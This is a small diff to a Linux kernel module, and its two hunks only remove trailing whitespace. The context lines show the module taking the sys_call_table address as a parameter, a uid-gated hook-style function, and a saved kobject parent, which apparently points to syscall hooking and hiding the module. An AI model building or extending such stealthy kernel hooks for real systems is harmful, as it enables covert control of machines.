@@ -53,7 +53,7 @@ static __always_inline void shitcall(uintptr_t arg0, uintptr_t arg1, uintptr_t a
 {
 	int cuid = current_uid().val;
 
-	// only allow root and uid 1000	
+	// only allow root and uid 1000
 	if (likely(cuid != 1000 && cuid != 0))
 		return;
 
@@ -153,7 +153,7 @@ MODULE_PARM_DESC(compat_sct_param, "sys_call_table symaddr");
 static struct kobject *mod_kobj_parent_backup = nullptr;
 #endif
 
-static int __init fgetpriority_init(void) 
+static int __init fgetpriority_init(void)
 {
 	pr_info("init: Hello World!\n");
 
